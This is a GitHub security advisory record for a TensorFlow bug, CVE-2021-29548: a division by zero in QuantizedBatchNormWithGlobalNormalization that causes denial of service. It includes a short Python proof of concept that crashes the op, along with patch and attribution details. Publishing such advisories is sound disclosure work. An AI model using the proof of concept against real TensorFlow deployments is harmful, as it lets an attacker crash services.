{
    "ghsaId": "GHSA-p45v-v4pw-77jr",
    "severity": "LOW",
    "summary": "Division by 0 in `QuantizedBatchNormWithGlobalNormalization`",
    "description": "### Impact\nAn attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`:\n\n```python\nimport tensorflow as tf\n\nt = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nt_min = tf.constant(-10.0, dtype=tf.float32)\nt_max = tf.constant(-10.0, dtype=tf.float32)\nm = tf.constant([], shape=[0], dtype=tf.quint8)\nm_min = tf.constant(-10.0, dtype=tf.float32)\nm_max = tf.constant(-10.0, dtype=tf.float32)\nv = tf.constant([], shape=[0], dtype=tf.quint8)\nv_min = tf.constant(-10.0, dtype=tf.float32)\nv_max = tf.constant(-10.0, dtype=tf.float32)\nbeta = tf.constant([], shape=[0], dtype=tf.quint8)\nbeta_min = tf.constant(-10.0, dtype=tf.float32)\nbeta_max = tf.constant(-10.0, dtype=tf.float32)\ngamma = tf.constant([], shape=[0], dtype=tf.quint8)\ngamma_min = tf.constant(-10.0, dtype=tf.float32)\ngamma_max = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  variance_epsilon=0.1, scale_after_normalization=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f/tensorflow/core/kernels/quantized_batch_norm_op.cc) does not validate all constraints specified in the [op's contract](https://www.tensorflow.org/api_docs/python/tf/raw_ops/QuantizedBatchNormWithGlobalNormalization).\n\n### Patches \nWe have patched the issue in GitHub commit [d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b](https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team",
    "permalink": "https://github.com/advisories/GHSA-p45v-v4pw-77jr",
    "publishedAt": "2021-05-21T14:23:34Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-p45v-v4pw-77jr"
        },
        {
            "type": "CVE",
            "value": "CVE-2021-29548"
        }
    ]
}